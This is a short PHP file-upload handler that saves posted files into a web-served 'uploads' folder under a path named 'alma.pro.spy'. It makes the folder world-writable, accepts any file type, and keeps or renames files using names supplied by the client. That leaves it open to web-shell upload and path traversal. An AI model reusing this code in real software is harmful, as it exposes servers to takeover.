<?php
	$getFile = $_POST['fileinfo'];
	$uploadDir = "/var/www/html/alma.pro.spy/uploads/"; // Most be changed when it various.
	mkdir($uploadDir);
	chmod($uploadDir, 0707);
	if(!empty($_FILES['file'])){
		if($_FILES['file']['error'] > 0){
			echo "Error: " . $_FILES['file']['error'];
		}else{
			move_uploaded_file($_FILES["file"]["tmp_name"], $uploadDir . $_FILES["file"]["name"]);
			if(isset($getFile)){
				if(!empty($getFile)){
					rename($uploadDir . $_FILES["file"]["name"], $uploadDir . $getFile);
				}
			}
			die("<script>alert('File was uploaded successfully.');setTimeout(window.close,100);</script>");
		}
	}else{
		die("File was not uploaded.");
	}
?>
